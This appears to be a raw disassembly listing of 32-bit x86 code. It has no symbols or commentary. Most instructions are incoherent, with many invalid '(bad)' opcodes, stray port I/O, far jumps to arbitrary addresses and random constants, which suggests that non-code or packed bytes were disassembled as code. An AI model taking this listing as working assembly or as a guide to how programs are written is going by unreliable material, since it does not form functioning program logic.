  41ac7f:	sbb    al,dl
  41ac81:	repnz inc esp
  41ac83:	xor    edi,DWORD PTR [ebp+eax*1+0x54207cf2]
  41ac8a:	sbb    BYTE PTR [ebx-0x30],al
  41ac8d:	dec    ebp
  41ac8e:	pushf  
  41ac8f:	adc    DWORD PTR [ebp+eax*4+0x3f],ebp
  41ac93:	xchg   DWORD PTR [ebx-0x25],ebx
  41ac96:	enter  0x40f6,0x38
  41ac9a:	(bad)  
  41ac9b:	pushf  
  41ac9c:	fprem1 
  41ac9e:	pop    esi
  41ac9f:	and    dh,BYTE PTR [edi-0x4e]
  41aca2:	mov    es,WORD PTR [eax]
  41aca4:	pop    ss
  41aca5:	into   
  41aca6:	cs cdq 
  41aca8:	test   BYTE PTR [eax+0x0],al
  41acab:	jecxz  0x41acea
  41acad:	xchg   edi,eax
  41acae:	shl    al,cl
  41acb0:	fadd   DWORD PTR [ecx-0x14]
  41acb3:	in     eax,0x48
  41acb5:	fstp   DWORD PTR [esi]
  41acb7:	xlat   BYTE PTR ds:[ebx]
  41acb8:	push   ds
  41acb9:	sti    
  41acba:	cmp    DWORD PTR [edx],esi
  41acbc:	cmp    edx,DWORD PTR [esi-0x3a]
  41acbf:	rcr    DWORD PTR [esi-0x5],1
  41acc2:	call   0x5704:0x4df84980
  41acc9:	shl    BYTE PTR [eax+0x6308cf49],cl
  41accf:	(bad)  
  41acd0:	loopne 0x41ac76
  41acd2:	xlat   BYTE PTR ds:[ebx]
  41acd3:	sub    ebx,edi
  41acd5:	adc    BYTE PTR ss:[ecx+ebp*4+0x7c],dl
  41acda:	aad    0x10
  41acdc:	pop    esi
  41acdd:	xchg   edi,eax
  41acde:	pop    ebp
  41acdf:	loope  0x41acb0
  41ace1:	das    
  41ace2:	ret    0x8ac8
  41ace5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace6:	fimul  DWORD PTR [ecx]
  41ace8:	lods   al,BYTE PTR ds:[esi]
  41ace9:	and    DWORD PTR [esi+0x3],ebx
  41acec:	cs stos BYTE PTR es:[edi],al
  41acee:	arpl   WORD PTR [ebx-0x6a7ed379],di
  41acf4:	pop    ds
  41acf5:	(bad)  
  41acf7:	dec    DWORD PTR [ecx+0x21be3140]
  41acfd:	jo     0x41ad2a
  41acff:	fsub   QWORD PTR [eax+0xd24467c]
  41ad05:	inc    eax
  41ad06:	sub    edi,DWORD PTR [esi-0x42]
  41ad09:	out    0x60,eax
  41ad0b:	mov    DWORD PTR [ebp+0x5ff02c97],esp
  41ad11:	repz xor al,0xc2
  41ad14:	dec    edx
  41ad15:	mov    ebp,0xfc599e0c
  41ad1a:	mov    ebp,0xc83bc2e8
  41ad1f:	dec    esp
  41ad20:	xor    esi,DWORD PTR [edx+edi*1+0x46]
  41ad24:	imul   esi,DWORD PTR [ebx],0x7fd4dbcb
  41ad2a:	xchg   ecx,eax
  41ad2b:	(bad)  
  41ad2c:	int    0x62
  41ad2e:	aaa    
  41ad2f:	jmp    0xf4ca9bdd
  41ad34:	and    DWORD PTR [ebx],esp
  41ad36:	sub    dh,ch
  41ad38:	in     eax,dx
  41ad39:	ffree  st(6)
  41ad3b:	mov    ebx,0xa6f46c49
  41ad40:	dec    edx
  41ad41:	jl     0x41acfb
  41ad43:	aad    0x93
  41ad45:	jb     0x41ad55
  41ad47:	cdq    
  41ad48:	int    0x2
  41ad4a:	cwde   
  41ad4b:	test   DWORD PTR [ecx-0x61],esp
  41ad4e:	(bad)  
  41ad50:	push   eax
  41ad51:	mov    al,ds:0x8683c9d1
  41ad56:	sub    eax,0x396ee2c9
  41ad5b:	scas   al,BYTE PTR es:[edi]
  41ad5c:	add    eax,0xf422330d
  41ad61:	xchg   edi,eax
  41ad62:	stc    
  41ad63:	in     al,0x6d
  41ad65:	inc    ebx
  41ad66:	xlat   BYTE PTR ds:[ebx]
  41ad67:	bound  ebx,QWORD PTR [edi+ebx*4]
  41ad6a:	das    
  41ad6b:	or     DWORD PTR [esi+0x326fec5b],esp
  41ad71:	mov    esi,0xb2939fbe
  41ad76:	retf   0xf99b
  41ad79:	ds jne 0x41adad
  41ad7c:	mov    bh,0x19
  41ad7e:	xchg   ecx,eax
  41ad7f:	(bad)  
  41ad81:	(bad)  [ebp+0x22]
  41ad84:	jl     0x41ad23
  41ad86:	(bad)
  41ad89:	dec    ebx
  41ad8a:	xor    bh,bl
  41ad8c:	fist   DWORD PTR [ebp-0x29]
  41ad8f:	or     eax,0x75d3c533
  41ad94:	dec    edx
  41ad95:	cmp    eax,DWORD PTR [edi]
  41ad97:	lods   eax,DWORD PTR ds:[esi]
  41ad98:	dec    esp
  41ad99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad9b:	retf   
  41ad9c:	sub    BYTE PTR [edx],cl
  41ad9e:	mov    edi,0xa06054d
  41ada3:	lea    ebp,[ecx+edi*4+0x61]
  41ada7:	cmp    BYTE PTR [esi],dh
  41ada9:	jg     0x41ada1
  41adab:	mov    eax,0x89c0f249
  41adb0:	jb     0x41ae21
  41adb2:	add    BYTE PTR [eax],bl
  41adb4:	xchg   ecx,eax
  41adb5:	cs ss dec ebx
  41adb8:	je     0x41adc0
  41adba:	clc    
  41adbb:	pop    edx
  41adbc:	rol    eax,1
  41adbe:	out    dx,eax
  41adbf:	sub    DWORD PTR [ecx+0x1a],ebp
  41adc2:	imul   ebp,DWORD PTR [ebp-0x6923b459],0x4a
  41adc9:	sti    
  41adca:	and    BYTE PTR [edx],ah
  41adcc:	mov    dl,0x6e
  41adce:	pushf  
  41adcf:	push   edi
  41add0:	imul   esp,DWORD PTR [esi-0x2c24e4dd],0xffffffe8
  41add7:	add    eax,0xc9d61fa0
  41addc:	aad    0xcc
  41adde:	cmc    
  41addf:	push   edx
  41ade0:	jl     0x41adb2
  41ade2:	hlt    
  41ade3:	scas   eax,DWORD PTR es:[edi]
  41ade4:	xchg   DWORD PTR [ebx],ebp
  41ade6:	mov    esi,0x8437b71d
  41adeb:	pusha  
  41adec:	sub    BYTE PTR [esi],ch
  41adee:	les    eax,FWORD PTR [ecx+edx*4+0x4e]
  41adf2:	popf   
  41adf3:	fiadd  WORD PTR ds:0x79b07b9
  41adf9:	repz pop es
  41adfb:	fld    DWORD PTR [ebp+ebp*1-0x3]
  41adff:	push   0xc6220556
  41ae04:	(bad)  
  41ae05:	mov    bl,0x12
  41ae07:	jg     0x41add4
  41ae09:	sahf   
  41ae0a:	sbb    DWORD PTR [ebx],edx
  41ae0c:	das    
  41ae0d:	data16 cmp bh,ch
  41ae10:	fs sub edx,edx
  41ae13:	out    dx,eax
  41ae14:	xchg   ebp,eax
  41ae15:	cmp    ch,BYTE PTR [esi+0x5db24cd1]
  41ae1b:	lock shl DWORD PTR [esi-0x7c],0x66
  41ae20:	jmp    0x41ae7a
  41ae22:	xchg   esp,eax
  41ae23:	jbe    0x41add9
  41ae25:	xor    eax,0xccebfa09
  41ae2a:	repnz xchg ecx,eax
  41ae2c:	pop    ss
  41ae2d:	pusha  
  41ae2e:	sub    al,0x26
  41ae30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae31:	push   es
  41ae32:	xchg   DWORD PTR [ecx+eiz*2],ecx
  41ae35:	ins    BYTE PTR es:[edi],dx
  41ae36:	aam    0x74
  41ae38:	jmp    0x83ba:0xf31839d4
  41ae3f:	push   es
  41ae40:	lods   al,BYTE PTR ds:[esi]
  41ae41:	test   BYTE PTR [edi],bh
  41ae43:	xlat   BYTE PTR ds:[ebx]
  41ae44:	push   0xd0acb869
  41ae49:	cli    
  41ae4a:	push   ebx
  41ae4b:	jae    0x41ae12
  41ae4d:	xchg   ebp,eax
  41ae4e:	and    dl,al
  41ae50:	shl    BYTE PTR [ebx],1
  41ae52:	in     eax,dx
  41ae53:	mov    edx,0x317ac423
  41ae58:	jp     0x41adec
  41ae5a:	jnp    0x41ae9a
  41ae5c:	xor    BYTE PTR [ecx-0x2a03eb62],bh
  41ae62:	(bad)  
  41ae63:	mov    ds:0x66fa0a7d,al
  41ae68:	js     0x41adff
  41ae6a:	cmp    eax,esi
  41ae6c:	cwde   
  41ae6d:	sub    BYTE PTR [edi+0x3995f890],ch
  41ae73:	add    eax,0xd8a4bead
  41ae78:	clc    
  41ae79:	cmp    bh,cl
  41ae7b:	ins    DWORD PTR es:[edi],dx
  41ae7c:	pop    ecx
  41ae7d:	test   al,0xc0
  41ae7f:	sub    al,0xab
  41ae81:	test   DWORD PTR [edx+ebx*1],edx
  41ae84:	fscale 
  41ae86:	loop   0x41ae27
  41ae88:	add    DWORD PTR [edx-0x4a],ecx
  41ae8b:	or     esp,DWORD PTR [ebp+0x13]
  41ae8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae8f:	daa    
  41ae90:	cmp    edi,DWORD PTR [ebp+0x43110008]
  41ae96:	mov    al,0x91
  41ae98:	xlat   BYTE PTR ds:[ebx]
  41ae99:	inc    edi
  41ae9a:	xchg   BYTE PTR [edx+0xe7cd48f],bh
  41aea0:	mov    dh,0x4f
  41aea2:	cmp    al,0xe6
  41aea4:	lock xchg ecx,eax
  41aea6:	pop    eax
  41aea7:	ins    BYTE PTR es:[edi],dx
  41aea8:	mov    dh,0x7e
  41aeaa:	add    al,0x6a
  41aeac:	dec    ebx
  41aead:	pop    esi
  41aeae:	fs pusha 
  41aeb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb1:	mov    esi,0x9b67b809
  41aeb6:	adc    eax,DWORD PTR [edi+0x67]
  41aeb9:	sbb    al,0xcf
  41aebb:	mov    ch,0xa4
  41aebd:	pop    es
  41aebe:	cmp    ch,BYTE PTR [edx-0x5d]
  41aec1:	fdivp  st(0),st
  41aec4:	xchg   esp,eax
  41aec5:	jmp    0x1b057e5f
  41aeca:	xchg   edx,eax
  41aecb:	gs inc edi
  41aecd:	popa   
  41aece:	stc    
  41aecf:	add    esp,DWORD PTR ds:0xab270cb8
  41aed5:	add    bl,BYTE PTR [edi]
  41aed7:	mov    cl,0xe5
  41aed9:	mov    dl,0x8c
  41aedb:	pop    edx
  41aedc:	cwde   
  41aedd:	leave  
  41aede:	sbb    edx,DWORD PTR [ebx]
  41aee0:	repz and DWORD PTR [ebx+0x3921589e],edi
  41aee7:	pop    edi
  41aee8:	jle    0x41af4d
  41aeea:	daa    
  41aeeb:	xchg   edi,eax
  41aeec:	adc    cl,bh
  41aeee:	shr    DWORD PTR [ebp-0x7a],1
  41aef1:	scas   eax,DWORD PTR es:[edi]
  41aef2:	adc    cl,BYTE PTR [eax]
  41aef4:	mov    dl,0x21
  41aef6:	cld    
  41aef7:	mov    DWORD PTR [edx],edx
  41aef9:	imul   ebx,DWORD PTR [ebp-0x238e421f],0xffffff91
  41af00:	outs   dx,BYTE PTR ds:[esi]
  41af01:	cmp    DWORD PTR [ebx-0x11e4db8f],edx
  41af07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af08:	push   0xffffff83
  41af0a:	adc    eax,0x997f113e
  41af0f:	add    cl,BYTE PTR ds:0xdec1d784
  41af15:	ficom  WORD PTR [edx-0x6e83bf93]
  41af1b:	or     ah,cl
  41af1d:	dec    edx
  41af1e:	pop    esp
  41af1f:	push   ss
  41af20:	sbb    DWORD PTR [edi+0x4281bd62],eax
  41af26:	sbb    dl,BYTE PTR [ebx]
  41af28:	xchg   DWORD PTR [ecx+ebp*4],edi
  41af2b:	or     BYTE PTR [esp+ebx*2-0x357b66fd],dl
  41af32:	dec    esi
  41af33:	add    esi,DWORD PTR [ecx]
  41af35:	lds    esi,FWORD PTR [esi+0x53b6061]
  41af3b:	fist   DWORD PTR [edi-0x4c]
  41af3e:	in     al,dx
  41af3f:	loop   0x41afb4
  41af41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af42:	and    bl,ah
  41af44:	pushf  
  41af45:	jb     0x41af11
  41af47:	cmp    DWORD PTR [edx],0xc52f5916
  41af4d:	cmc    
  41af4e:	jecxz  0x41af79
  41af50:	stos   DWORD PTR es:[edi],eax
  41af51:	lods   eax,DWORD PTR ds:[esi]
  41af52:	jno    0x41aed5
  41af54:	adc    edx,eax
  41af56:	xor    dh,BYTE PTR [eax+0x50749c3b]
  41af5c:	shl    DWORD PTR [eax-0x3a],0x87
  41af60:	cmc    
  41af61:	fst    st(2)
  41af63:	mov    ah,0x8e
  41af65:	js     0x41af05
  41af67:	pop    ebx
  41af68:	outs   dx,DWORD PTR ds:[esi]
  41af69:	in     eax,dx
  41af6a:	fld    QWORD PTR [ecx-0x6d]
  41af6d:	out    0xd3,al
  41af6f:	xor    eax,0xacb22f3c
  41af74:	cli    
  41af75:	stos   BYTE PTR es:[edi],al
  41af76:	xchg   esi,eax
  41af77:	ds out 0x9c,eax
  41af7a:	sbb    DWORD PTR [ebx],ebp
  41af7c:	jecxz  0x41af5a
  41af7e:	sbb    bl,BYTE PTR [esi-0x7b7b9459]
  41af84:	ss std 
  41af86:	pop    esi
  41af87:	mov    eax,0x97e47ba
  41af8c:	out    0xd3,al
  41af8e:	dec    esi
  41af8f:	jno    0x41afab
  41af91:	daa    
  41af92:	xchg   ebp,eax
  41af93:	mov    dl,0xbf
  41af95:	fldenv [esi+0x66601a2f]
  41af9b:	sahf   
  41af9c:	adc    dl,BYTE PTR [edi]
  41af9e:	imul   edx,DWORD PTR [edx-0x2ee3a0c],0x5afb65d1
  41afa8:	lahf   
  41afa9:	cmp    DWORD PTR [esi+ebx*2],eax
  41afac:	(bad)  
  41afad:	ja     0x41af38
  41afaf:	inc    esp
  41afb0:	call   0x1785:0x60da375
  41afb7:	fidiv  DWORD PTR [edx-0x68]
  41afba:	mov    al,0x48
  41afbc:	fmul   DWORD PTR [edi+0x52]
  41afbf:	or     BYTE PTR [ecx+0x4f0c4d58],dh
  41afc5:	pop    eax
  41afc6:	mov    al,ds:0xd948bdec
  41afcb:	in     eax,dx
  41afcc:	(bad)  
  41afcd:	push   0x69
  41afcf:	aad    0x2
  41afd1:	dec    esp
  41afd2:	xor    DWORD PTR [edx],edi
  41afd4:	xchg   BYTE PTR [ebx-0x7b0134e5],dl
  41afda:	xchg   edx,eax
  41afdb:	dec    ebx
  41afdc:	je     0x41b022
  41afde:	dec    esp
  41afdf:	inc    esi
  41afe0:	scas   al,BYTE PTR es:[edi]
  41afe1:	dec    edx
  41afe2:	sar    dh,cl
  41afe4:	or     eax,0x43555faf
  41afe9:	or     cl,BYTE PTR [edi]
  41afeb:	xchg   edi,eax
  41afec:	(bad)  
  41afed:	sub    esp,DWORD PTR [esi+0x14]
  41aff0:	push   esi
  41aff1:	mov    cl,0xf9
  41aff3:	int    0x96
  41aff5:	add    esp,DWORD PTR [ebp+0x65196c03]
  41affb:	cmp    DWORD PTR ds:0xa8eb46a2,ecx
  41b001:	sub    DWORD PTR [edi-0x4a],eax
  41b004:	jle    0x41afb9
  41b006:	cmp    BYTE PTR [esi],bl
  41b008:	ror    DWORD PTR [ebx-0xff53a1],cl
  41b00e:	fidiv  DWORD PTR [ebx-0x6f2f3d8c]
  41b014:	cmc    
  41b015:	es call 0x9a28a444
  41b01b:	mov    cs:0xbe4df338,al
  41b021:	and    BYTE PTR [ecx-0x1db62cd7],bh
  41b027:	call   0xe971b1d4
  41b02c:	jecxz  0x41b025
  41b02e:	or     DWORD PTR [eax+0x43945434],0x42499ffa
  41b038:	mov    ds,WORD PTR [edi]
  41b03a:	into   
  41b03b:	sti    
  41b03c:	mov    edx,0x44330a07
  41b041:	xor    dl,BYTE PTR [ebp+0x5a953da]
  41b047:	fisubr WORD PTR [edx-0x3b]
  41b04a:	bnd jns 0x41aff4
  41b04d:	push   0xffffffc8
  41b04f:	aam    0x9b
  41b051:	out    0xc,eax
  41b053:	js     0x41afeb
  41b055:	in     eax,dx
  41b056:	xchg   BYTE PTR [edx-0x9],al
  41b059:	mov    ch,0x2f
  41b05b:	pop    eax
  41b05c:	pushf  
  41b05d:	sbb    dh,dh
  41b05f:	inc    ebx
  41b060:	mov    ecx,DWORD PTR [esi+ebp*1]
  41b063:	xchg   edi,eax
  41b064:	aam    0x6d
  41b066:	ret    0x258b
  41b069:	xor    eax,0xdd8e9d0f
  41b06e:	add    eax,0xf8e3c659
  41b073:	xor    DWORD PTR [ebp-0x2c2f792],esi
  41b079:	jae    0x41b01d
  41b07b:	push   esp
  41b07c:	pop    ecx
  41b07d:	repz test al,0x56
  41b080:	mov    ds:0x6f61a19c,eax
  41b085:	or     al,cl
  41b087:	enter  0x5a81,0x6f
  41b08b:	and    eax,ecx
  41b08d:	mov    eax,es:0xd159b2af
  41b093:	or     eax,0xa1d1e8bb
  41b098:	outs   dx,BYTE PTR ds:[esi]
  41b099:	hlt    
  41b09a:	pop    edx
  41b09b:	push   ebp
  41b09c:	cdq    
  41b09d:	rcr    ecx,0x52
  41b0a0:	icebp  
  41b0a1:	lock sub bh,bl
  41b0a4:	xchg   esp,eax
  41b0a5:	out    dx,eax
  41b0a6:	cmp    ecx,DWORD PTR [eax+0x370b7182]
  41b0ac:	cli    
  41b0ad:	mov    esi,0xc34da786
  41b0b2:	inc    ebx
  41b0b3:	fdiv   QWORD PTR [eax]
  41b0b5:	ficom  DWORD PTR [esi+0x219c58e4]
  41b0bb:	mov    edi,0xbfb3ecec
  41b0c0:	mov    gs,WORD PTR [ecx]
  41b0c2:	nop
  41b0c3:	pop    ebp
  41b0c4:	mov    bh,bh
  41b0c6:	mov    ebx,0x2ed4c89f
  41b0cb:	and    dl,BYTE PTR [esp+eiz*8]
  41b0ce:	dec    edi
  41b0cf:	push   ecx
  41b0d0:	ja     0x41b078
  41b0d2:	mov    edx,0x99a39b36
  41b0d7:	and    BYTE PTR [edi],cl
  41b0d9:	add    ah,0x69
  41b0dc:	loopne 0x41b0dc
  41b0de:	inc    ebx
  41b0df:	aas    
  41b0e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0e1:	fdiv   DWORD PTR ds:0xd3a3dfdb
  41b0e7:	sti    
  41b0e8:	pop    ebp
  41b0e9:	test   al,0x6d
  41b0eb:	fidivr WORD PTR [ebx]
  41b0ed:	aas    
  41b0ee:	or     BYTE PTR [edi+0x60763dad],dl
  41b0f4:	shr    bh,1
  41b0f6:	inc    esi
  41b0f7:	dec    ebp
  41b0f8:	xor    ch,dl
  41b0fa:	ret    0xfd2a
  41b0fd:	mov    ecx,0xe6851c17
  41b102:	call   DWORD PTR [ebp+0xb]
  41b105:	aad    0xca
  41b107:	pop    esi
  41b108:	pop    eax
  41b109:	lock pop ebp
  41b10b:	lods   eax,DWORD PTR ds:[esi]
  41b10c:	in     al,dx
  41b10d:	ror    esi,cl
  41b10f:	push   0xd74fa1dc
  41b114:	mov    bl,0x66
  41b116:	sub    cl,BYTE PTR [ecx*8-0xc035c01]
  41b11d:	js     0x41b13a
  41b11f:	div    DWORD PTR [edi]
  41b121:	test   al,0xe2
  41b123:	test   BYTE PTR [edi+0x3b],bl
  41b126:	inc    ecx
  41b127:	cmp    eax,0x6437d242
  41b12c:	adc    BYTE PTR [esi+0x3],0xa0
  41b130:	(bad)  
  41b131:	shl    DWORD PTR [ecx+eiz*4+0x56],1
  41b135:	xchg   ebx,eax
  41b136:	add    eax,0xfa8ce0f7
  41b13b:	dec    eax
  41b13c:	sti    
  41b13d:	sbb    BYTE PTR [esp+edi*1+0x61c356ed],dl
  41b144:	cmp    edx,DWORD PTR ds:0xbe18f205
  41b14a:	aas    
  41b14b:	jb     0x41b1c1
  41b14d:	popf   
  41b14e:	aaa    
  41b14f:	mov    al,ds:0xadd53a15
  41b154:	stos   DWORD PTR es:[edi],eax
  41b155:	lea    edx,ds:0xdac0904a
  41b15b:	iret   
  41b15c:	aad    0x77
  41b15e:	xchg   DWORD PTR [ebp+0x53],esp
  41b161:	and    DWORD PTR [ebx],edi
  41b163:	xor    ebx,DWORD PTR [ebx-0x5947afa8]
  41b169:	imul   ebx,DWORD PTR [esi],0x962b8147
  41b16f:	fimul  WORD PTR [eax+0x4]
  41b172:	xchg   esp,eax
  41b173:	gs lahf 
  41b175:	xchg   esi,eax
  41b176:	inc    esp
  41b177:	cld    
  41b178:	add    esi,DWORD PTR [eax+edx*2+0x56060a9f]
  41b17f:	(bad)  
  41b180:	(bad)  
  41b181:	sbb    DWORD PTR [edi],ecx
  41b183:	hlt    
  41b184:	inc    esp
  41b185:	test   eax,0x75a153e5
  41b18a:	pop    ds
  41b18b:	push   es
  41b18c:	and    al,0x78
  41b18e:	(bad)  
  41b18f:	sbb    ebp,DWORD PTR [eax-0x660b4eaf]
  41b195:	popa   
  41b196:	ins    DWORD PTR es:[edi],dx
  41b197:	out    dx,eax
  41b198:	xor    ebp,0xffffffed
  41b19b:	(bad)  
  41b19c:	mov    ecx,0xb2d5005b
  41b1a1:	imul   esp,ebp,0xc
  41b1a4:	xchg   edi,eax
  41b1a5:	mov    dh,0xaa
  41b1a7:	pop    esp
  41b1a8:	inc    sp
  41b1aa:	dec    edi
  41b1ab:	test   eax,0xeccdcf29
  41b1b0:	addr16 and eax,0x50c21f63
  41b1b6:	out    dx,eax
  41b1b7:	sbb    DWORD PTR [esi-0x7115a2c3],ebx
  41b1bd:	stos   DWORD PTR es:[edi],eax
  41b1be:	jecxz  0x41b1a3
  41b1c0:	outs   dx,DWORD PTR ds:[esi]
  41b1c1:	sahf   
  41b1c2:	mov    eax,ds:0x1531dafb
  41b1c7:	push   0xf95c670a
  41b1cc:	outs   dx,DWORD PTR ds:[esi]
  41b1cd:	and    esi,DWORD PTR [edi]
  41b1cf:	inc    ebp
  41b1d0:	adc    ebp,esi
  41b1d2:	dec    edi
  41b1d3:	fsubr  QWORD PTR [ebx-0x3ff6c899]
  41b1d9:	enter  0x89e,0x36
  41b1dd:	jmp    0x1c63b63f
  41b1e2:	fadd   st(7),st
  41b1e4:	add    al,0xf0
  41b1e6:	loopne 0x41b262
  41b1e8:	jne    0x41b23b
  41b1ea:	popa   
  41b1eb:	or     al,0xcc
  41b1ed:	sub    eax,0x5324a514
  41b1f2:	adc    eax,0xe092a59e
  41b1f7:	cmp    al,0x65
  41b1f9:	mov    eax,0xd8b96c57
  41b1fe:	popa   
  41b1ff:	test   bh,bh
  41b201:	jae    0x41b188
  41b203:	imul   ecx,DWORD PTR [edx*8+0x59ff35e3],0x9ec2e334
  41b20e:	mov    ch,0x52
  41b210:	std    
  41b211:	xor    eax,DWORD PTR [ebx-0xf]
  41b214:	rcl    BYTE PTR [edi+edi*2+0x5a4d73a9],cl
  41b21b:	push   es
  41b21c:	imul   DWORD PTR [edx+0x7333d620]
  41b222:	test   DWORD PTR [edx],ecx
  41b224:	sub    DWORD PTR [ebx-0x27],ebx
  41b227:	push   ebp
  41b228:	mov    cl,0x51
  41b22a:	cli    
  41b22b:	test   BYTE PTR [eax-0x6d31d16d],cl
  41b231:	stos   DWORD PTR es:[edi],eax
  41b232:	sub    BYTE PTR [ecx],ah
  41b234:	mov    eax,?
  41b236:	sbb    DWORD PTR [eax-0x79],edi
  41b239:	mov    al,0x7a
  41b23b:	jae    0x41b21e
  41b23d:	in     eax,0x76
  41b23f:	test   eax,0x29aac4da
  41b244:	add    al,0xc7
  41b246:	ins    BYTE PTR es:[edi],dx
  41b247:	iret   
  41b248:	cmp    DWORD PTR [esi],eax
  41b24a:	mov    ebx,0xc94c03b6
  41b24f:	out    dx,al
  41b250:	(bad)  
  41b251:	mov    WORD PTR [ebp-0x76],?
  41b254:	(bad)  
  41b256:	inc    esp
  41b257:	pusha  
  41b258:	fs mov esp,edx
  41b25b:	push   0x2d
  41b25d:	int3   
  41b25e:	jmp    0x4d76:0x84ee6a76
  41b265:	add    al,0xfe
  41b267:	das    
  41b268:	and    edx,esi
  41b26a:	ja     0x41b2aa
  41b26c:	jp     0x41b2dd
  41b26e:	aas    
  41b26f:	mov    edi,0xd960abf3
  41b274:	stc    
  41b275:	loopne 0x41b2e1
  41b277:	xor    al,0xc6
  41b279:	push   es
  41b27a:	xor    BYTE PTR [edx+0x24140fab],dh
  41b280:	mov    ah,0xbb
  41b282:	mov    edi,0x23816b9d
  41b287:	data16 das 
  41b289:	jp     0x41b243
  41b28b:	test   dl,dl
  41b28d:	dec    edx
  41b28e:	(bad)  
  41b28f:	cs sti 
  41b291:	ficom  WORD PTR ds:0x27387339
  41b297:	sbb    al,0x7f
  41b299:	adc    eax,0x5bdc61a1
  41b29e:	add    al,0x85
  41b2a0:	xchg   edx,eax
  41b2a1:	ds ja  0x41b227
  41b2a4:	into   
  41b2a5:	repz mov ebx,0xf605578e
  41b2ab:	loope  0x41b2f0
  41b2ad:	daa    
  41b2ae:	call   0xd27b:0x37f08c1b
  41b2b5:	pop    edi
  41b2b6:	test   BYTE PTR [ebx-0x5f3b3ed3],0x60
  41b2bd:	push   eax
  41b2be:	push   edi
  41b2bf:	xchg   edx,eax
  41b2c0:	mov    bl,0x43
  41b2c2:	ja     0x41b314
  41b2c4:	enter  0x5bf1,0xb4
  41b2c8:	loopne 0x41b24c
  41b2ca:	and    eax,0xdd551479
  41b2cf:	ja     0x41b28b
  41b2d1:	mov    bl,0x28
  41b2d3:	cmp    DWORD PTR [ebx],eax
  41b2d5:	cwde   
  41b2d6:	push   0x350853f1
  41b2db:	push   es
  41b2dc:	jecxz  0x41b348
  41b2de:	inc    cx
  41b2e0:	push   edi
  41b2e1:	fadd   QWORD PTR [ebp-0x34]
  41b2e4:	mov    bl,0xc2
  41b2e6:	or     ch,cl
  41b2e8:	in     al,0xa2
  41b2ea:	(bad)  
  41b2eb:	xchg   edx,eax
  41b2ec:	scas   al,BYTE PTR es:[edi]
  41b2ed:	jmp    0x4d427b8d
  41b2f2:	cli    
  41b2f3:	in     al,0x3f
  41b2f5:	jmp    0x404268e0
  41b2fa:	or     edi,DWORD PTR [ebp-0x2bcda0e0]
  41b300:	push   ecx
  41b301:	sub    DWORD PTR [ebx],ecx
  41b303:	inc    ebx
  41b304:	cmp    al,0xba
  41b306:	sbb    BYTE PTR [edx+0x189b791c],0xed
  41b30d:	mov    eax,0x99c83a8e
  41b312:	fcom   QWORD PTR [ebp-0x34e8694d]
  41b318:	pop    esi
  41b319:	xchg   esi,eax
  41b31a:	cmp    ebx,ecx
  41b31c:	popf   
  41b31d:	and    eax,0xbaab9947
  41b322:	jmp    0x842157df
  41b327:	mov    dh,0x5e
  41b329:	dec    edi
  41b32a:	add    DWORD PTR [eax],ebp
  41b32c:	std    
  41b32d:	fisttp WORD PTR [esi-0x1d75125c]
  41b333:	inc    edi
  41b334:	xchg   DWORD PTR [esi],edi
  41b336:	loop   0x41b32a
  41b338:	test   BYTE PTR [edi],cl
  41b33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b33b:	fmulp  st(2),st
  41b33d:	ins    BYTE PTR es:[edi],dx
  41b33e:	aaa    
  41b33f:	adc    DWORD PTR [esi+0x3e],esi
  41b342:	xor    BYTE PTR [edi],dh
  41b344:	inc    ebx
  41b345:	cld    
  41b346:	daa    
  41b347:	test   DWORD PTR [eax+0x3be6abea],ecx
  41b34d:	lods   al,BYTE PTR ds:[esi]
  41b34e:	xchg   BYTE PTR [ecx],bl
  41b350:	stos   DWORD PTR es:[edi],eax
  41b351:	imul   esp,ebx,0xac6674d1
  41b357:	adc    bh,bl
  41b359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b35a:	pop    esi
  41b35b:	call   0xbfe6db4e
  41b360:	stos   BYTE PTR es:[edi],al
  41b361:	fs inc eax
  41b363:	leave  
  41b364:	rol    BYTE PTR [ecx*8-0x152a1d5d],0x51
  41b36c:	aam    0xc9
  41b36e:	(bad)  
  41b36f:	mov    eax,0x21a0aa2e
  41b374:	aad    0x7a
  41b376:	push   cs
  41b377:	in     al,0xb0
  41b379:	retf   
  41b37a:	push   edx
  41b37b:	jbe    0x41b3e1
  41b37d:	sub    DWORD PTR [ecx+0x45],ecx
  41b380:	bound  esp,QWORD PTR ds:0x28a5f9de
  41b386:	pop    ebx
  41b387:	push   esi
  41b388:	repz jle 0x41b362
  41b38b:	cwde   
  41b38c:	jo     0x41b3f8
  41b38e:	scas   eax,DWORD PTR es:[edi]
  41b38f:	scas   eax,DWORD PTR es:[edi]
  41b390:	es cmc 
  41b392:	ja     0x41b324
  41b394:	(bad)  
  41b395:	gs jnp 0x41b3b6
  41b398:	pop    edx
  41b399:	or     bl,BYTE PTR [esi-0x7a]
  41b39c:	fidiv  WORD PTR [edx+0x74]
  41b39f:	and    ecx,DWORD PTR ds:0x6af47db9
  41b3a5:	pop    esp
  41b3a6:	pop    esi
  41b3a7:	add    bh,BYTE PTR [eax]
  41b3a9:	icebp  
  41b3aa:	sbb    eax,0xfe04b14
  41b3af:	(bad)  
  41b3b0:	in     al,dx
  41b3b1:	jl     0x41b3a6
  41b3b3:	sub    al,0xe8
  41b3b5:	out    dx,eax
  41b3b6:	cld    
  41b3b7:	pop    esi
  41b3b8:	sub    al,0x63
  41b3ba:	cmp    al,0xbe
  41b3bc:	(bad)  
  41b3bd:	gs into 
  41b3bf:	adc    al,0xf4
  41b3c1:	outs   dx,BYTE PTR ds:[esi]
  41b3c2:	mov    dh,0x79
  41b3c4:	adc    BYTE PTR [ebx-0x1d],0x7a
  41b3c8:	dec    ebp
  41b3c9:	adc    eax,0xa5c789d5
  41b3ce:	cmp    al,0x98
  41b3d0:	push   esi
  41b3d1:	cmp    al,0x14
  41b3d3:	dec    ebp
  41b3d4:	mov    WORD PTR [esi-0x321998a3],cs
  41b3da:	cmp    dh,cl
  41b3dc:	js     0x41b3cf
  41b3de:	(bad)  
